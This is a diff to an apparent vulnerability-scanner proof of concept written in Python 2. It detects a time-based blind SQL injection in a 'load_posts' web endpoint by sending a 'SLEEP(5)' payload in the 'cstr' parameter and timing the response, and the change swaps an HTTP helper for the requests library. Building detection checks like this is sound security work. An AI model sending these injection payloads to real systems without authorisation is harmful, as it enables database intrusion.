@@ -41,11 +41,10 @@ class Poc(ABPoc):
             post_data2 = 'action=load_posts&cstr==1%27)%20AND%20SLEEP(5)%20AND%20(%27WhYm%27=%27WhYm&sp=Post&spg=Page' 
             start_time1=time.time()
 
-            code, head, res, _,_ = hh.http('-d %s %s' % (post_data1,url))
+            req1 = requests.post(url, data=post_data1)
             end_time1 = time.time()
-            code, head, res, _,_ = hh.http('-d %s %s' % (post_data2,url))
-                       
-            if code == 200 and ((time.time()-end_time1)-(end_time1-start_time1))>5:
+            _req2 = requests.post(url, data=post_data2)
+            if (req1.status_code == 200 or _req2.status_code == 200) and ((time.time()-end_time1)-(end_time1-start_time1))>5:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
 
         except Exception, e:
